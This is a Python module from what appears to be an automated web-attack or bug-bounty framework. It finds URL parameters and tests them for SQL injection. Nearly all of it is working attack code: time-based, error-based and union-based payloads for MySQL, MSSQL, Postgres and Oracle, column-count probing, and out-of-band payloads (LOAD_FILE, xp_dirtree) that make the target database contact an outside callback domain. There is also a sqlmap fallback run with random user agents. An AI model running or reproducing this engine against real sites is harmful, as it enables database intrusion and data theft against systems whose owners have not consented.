#!/usr/bin/env python3
# modules/step08_sqli.py — SQLi Engine V7 (Full Internal Engine)
# Blueprint Fix: Internal time-based, union, error-based engines (no sqlmap dependency)
# Falls back to sqlmap only if internal finds nothing
# MilkyWay Intelligence | Author: Sharlix | AUTHORIZED USE ONLY

import os, re, time, asyncio, urllib.parse
import urllib.request, urllib.error
from core.utils import count_lines, safe_read
from core.error_handler import get_handler

TIME_PAYLOADS = {
    "mysql"   : [r"' AND SLEEP(5)-- -", r'" AND SLEEP(5)-- -', r"1 AND SLEEP(5)-- -"],
    "mssql"   : [r"'; WAITFOR DELAY '0:0:5'--"],
    "postgres": [r"'; SELECT pg_sleep(5)--"],
    "oracle"  : [r"' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"],
}

ERROR_PAYLOADS = ["'", '"', "`", "')","1' AND '1'='2","1 AND 1=2","' OR '1'='1"]

ERROR_SIGS = [
    (r"SQL syntax",            "mysql",    0.92),
    (r"ORA-\d{4,5}:",          "oracle",   0.95),
    (r"PostgreSQL.*ERROR",     "postgres", 0.90),
    (r"SQLSTATE\[",            "any",      0.85),
    (r"Unclosed quotation",    "mssql",    0.92),
    (r"unterminated quoted",   "postgres", 0.90),
    (r"mysql_fetch_array",     "mysql",    0.88),
    (r"supplied argument is not a valid MySQL", "mysql", 0.90),
]

UNION_TEST = "1 UNION SELECT {cols}-- -"


def _get_live_hosts(p, limit=100):
    """Returns live hosts - ALWAYS includes main target as fallback."""
    tgt = p.target.strip()
    if not tgt.startswith("http"):
        tgt = "https://" + tgt

    hosts = []
    seen  = set()

    for key in ("fmt_url", "live_hosts", "resolved"):
        src = p.files.get(key, "")
        if not src or not os.path.isfile(src):
            continue
        from core.utils import safe_read
        for line in safe_read(src):
            line = line.strip()
            if not line:
                continue
            if not line.startswith("http"):
                line = "https://" + line
            if line not in seen:
                seen.add(line)
                hosts.append(line)
        if hosts:
            break

    # GUARANTEED: always include main target
    if tgt not in seen:
        hosts.insert(0, tgt)

    return hosts[:limit]


class SQLiStep:
    def __init__(self, p): self.p=p; self.log=p.log; self.f=p.files

    def run(self):
        urls     = self.f["urls"]
        sqli_par = self.f["sqli_params"]
        results  = self.f["sqli_results"]

        # gf filter with numeric fallback
        self.p.shell(f"cat {urls} 2>/dev/null | gf sqli > {sqli_par} 2>/dev/null")
        if count_lines(sqli_par)==0:
            self._extract_numeric(urls, sqli_par)

        if count_lines(sqli_par)==0:
            self.log.warn("SQLi: no params found"); return

        targets = safe_read(sqli_par)
        self.log.info(f"SQLi: {len(targets)} params → internal engine")

        found_internal = 0

        # ENGINE 1: Error-based (fastest)
        for url in targets[:100]:
            try:
                if self._test_error_based(url):
                    found_internal += 1
            except Exception as e:
                get_handler().capture("step08_sqli", e, f"error_based:{url[:60]}")

        # ENGINE 2: Time-based (concurrent)
        try:
            loop = asyncio.new_event_loop()
            tf = loop.run_until_complete(self._test_time_based_batch(targets[:50]))
            found_internal += tf
            loop.close()
        except Exception as e:
            get_handler().capture("step08_sqli", e, "time_based_batch")

        # ENGINE 3: Union-based on confirmed error-based targets
        for url in targets[:100]:
            try:
                self._test_union_based(url)
            except Exception as e:
                get_handler().capture("step08_sqli", e, f"union:{url[:60]}")

        # ENGINE 4: OOB via Interactsh
        if self.p.oob:
            try: self._test_oob_sqli(targets[:100])
            except Exception as e: get_handler().capture("step08_sqli", e, "oob_sqli")

        # Fallback: sqlmap on top 5 if nothing found
        if found_internal == 0:
            self.log.info("Internal engine: no finds — trying sqlmap fallback")
            self._sqlmap_fallback(sqli_par, results)

        self.log.success(f"SQLi: {found_internal} findings (internal engine)")

    def _test_error_based(self, url: str) -> bool:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs: return False
        baseline = self._fetch(url)
        if not baseline: return False

        for param in list(qs.keys())[:5]:
            for payload in ERROR_PAYLOADS:
                tqs = dict(qs); tqs[param] = [payload]
                test_url = urllib.parse.urlunparse(
                    parsed._replace(query=urllib.parse.urlencode(tqs,doseq=True)))
                resp = self._fetch(test_url)
                if not resp: continue
                body = resp.get("body","")
                for pattern, db, conf in ERROR_SIGS:
                    if re.search(pattern, body, re.IGNORECASE):
                        detail = f"Error-based SQLi | db={db} | param={param} | payload={payload}"
                        with open(self.f["sqli_results"],"a") as f:
                            f.write(f"SQLI_ERROR: {test_url} | {detail}\n")
                        self.p.add_finding("critical","SQLI_ERROR_BASED",test_url,detail,"sqli-internal",
                                           response=body[:300],payload=payload,confidence=conf,status="confirmed")
                        return True
        return False

    async def _test_time_based_batch(self, urls: list) -> int:
        import httpx
        found = 0
        async with httpx.AsyncClient(verify=False, timeout=20) as client:
            for url in urls:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                    if not qs: continue
                    for param in list(qs.keys())[:3]:
                        for db, payloads in TIME_PAYLOADS.items():
                            for payload in payloads[:1]:
                                tqs = dict(qs); tqs[param] = [payload]
                                test_url = urllib.parse.urlunparse(
                                    parsed._replace(query=urllib.parse.urlencode(tqs,doseq=True)))
                                t0 = time.time()
                                try:
                                    r = await client.get(test_url, follow_redirects=True)
                                    elapsed = time.time()-t0
                                    if elapsed >= 4.5:
                                        conf = 0.95 if elapsed>=9 else 0.88
                                        detail = f"Time-based SQLi | db={db} | param={param} | delay={elapsed:.1f}s"
                                        with open(self.f["sqli_results"],"a") as f:
                                            f.write(f"SQLI_TIME: {test_url} | {detail}\n")
                                        self.p.add_finding("critical","SQLI_TIME_BASED",test_url,
                                            detail,"sqli-time",response="",payload=payload,
                                            confidence=conf,status="confirmed")
                                        found+=1; break
                                except Exception as _e:
                                    from core.error_handler import get_handler
                                    get_handler().capture("step08_sqli", _e)
                except Exception as e:
                    get_handler().capture("step08_sqli", e, f"async_time:{url[:60]}")
        return found

    def _test_union_based(self, url: str) -> bool:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs: return False
        param = list(qs.keys())[0]
        # Detect column count via ORDER BY
        cols = 1
        for n in range(1,11):
            tqs = dict(qs); tqs[param] = [f"1 ORDER BY {n}-- -"]
            test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(tqs,doseq=True)))
            r = self._fetch(test_url)
            if r and r.get("status") in (500,400):
                cols = n-1; break
        if cols < 1: return False
        # UNION SELECT
        null_cols = ",".join(["NULL"]*cols)
        # Try version() in first column
        for i in range(1, cols+1):
            ver_cols = ["NULL"]*cols; ver_cols[i-1] = "@@version"
            payload = f"0 UNION SELECT {','.join(ver_cols)}-- -"
            tqs = dict(qs); tqs[param] = [payload]
            test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(tqs,doseq=True)))
            r = self._fetch(test_url)
            if r and re.search(r"[0-9]+\.[0-9]+\.[0-9]+", r.get("body","")):
                detail = f"Union-based SQLi | cols={cols} | param={param}"
                with open(self.f["sqli_results"],"a") as f: f.write(f"SQLI_UNION: {test_url}\n")
                self.p.add_finding("critical","SQLI_UNION_BASED",test_url,detail,"sqli-union",
                                   response=r.get("body","")[:200],payload=payload,
                                   confidence=0.98,status="confirmed")
                return True
        return False

    def _test_oob_sqli(self, urls: list):
        oob_payload = self.p.oob.get_payload("sqli","oob_sql_test")
        oob_domain  = oob_payload.replace("http://","").replace("https://","")
        payloads = [
            f"' AND LOAD_FILE(CONCAT('\\\\\\\\','{oob_domain}','\\\\a'))-- -",
            f"'; exec master..xp_dirtree '//{oob_domain}/a'--",
        ]
        for url in urls[:100]:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            if not qs: continue
            param = list(qs.keys())[0]
            for payload in payloads:
                tqs = dict(qs); tqs[param] = [payload]
                test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(tqs,doseq=True)))
                try: self._fetch(test_url, timeout=8)
                except Exception as _e:
                    from core.error_handler import get_handler
                    get_handler().capture("step08_sqli", _e)

    def _sqlmap_fallback(self, sqli_params, results_out):
        sqli_outdir = os.path.join(self.p.out, f"{self.p.prefix}_sqlmap")
        cookie = f"--cookie '{self.p.args.cookie}'" if getattr(self.p.args,"cookie",None) else ""
        self.p.shell(f"sqlmap -m {sqli_params} --batch --random-agent --level=2 --risk=2 "
                     f"--output-dir={sqli_outdir} {cookie} --no-logging 2>/dev/null",
                     label="sqlmap fallback", timeout=900)
        # Parse results
        if not os.path.isdir(sqli_outdir): return
        for root,_,files in os.walk(sqli_outdir):
            for fname in files:
                try:
                    content = open(os.path.join(root,fname),errors="ignore").read()
                    if "sqlmap identified the following injection point" in content:
                        url_m   = re.search(r"URL:\s+(\S+)",content)
                        param_m = re.search(r"Parameter:\s+(.+?)(?:\n|$)",content)
                        type_m  = re.search(r"Type:\s+(.+?)(?:\n|$)",content)
                        if url_m:
                            detail = f"param={param_m.group(1).strip() if param_m else '?'} type={type_m.group(1).strip() if type_m else '?'}"
                            self.p.add_finding("critical","SQLI_CONFIRMED",url_m.group(1),
                                               detail,"sqlmap",confidence=0.95,status="confirmed")
                except Exception as e:
                    get_handler().capture("step08_sqli", e, "sqlmap_parse")

    def _extract_numeric(self, urls_file, out_file):
        if not os.path.isfile(urls_file): return
        added = set()
        with open(out_file,"w") as out:
            for url in safe_read(urls_file)[:1000]:
                try:
                    qs = urllib.parse.parse_qs(urllib.parse.urlparse(url).query,keep_blank_values=True)
                    for k,vals in qs.items():
                        if vals and vals[0].isdigit() and url not in added:
                            out.write(url+"\n"); added.add(url); break
                except Exception as _e:
                    from core.error_handler import get_handler
                    get_handler().capture("step08_sqli", _e)

    def _fetch(self, url, timeout=10):
        try:
            req  = urllib.request.Request(url,headers={"User-Agent":self.p.bypass.ua(),"Accept":"*/*"})
            resp = urllib.request.urlopen(req, timeout=timeout)
            return {"status":resp.status,"body":resp.read(50000).decode(errors="ignore")}
        except urllib.error.HTTPError as e:
            return {"status":e.code,"body":""}
        except Exception: return None
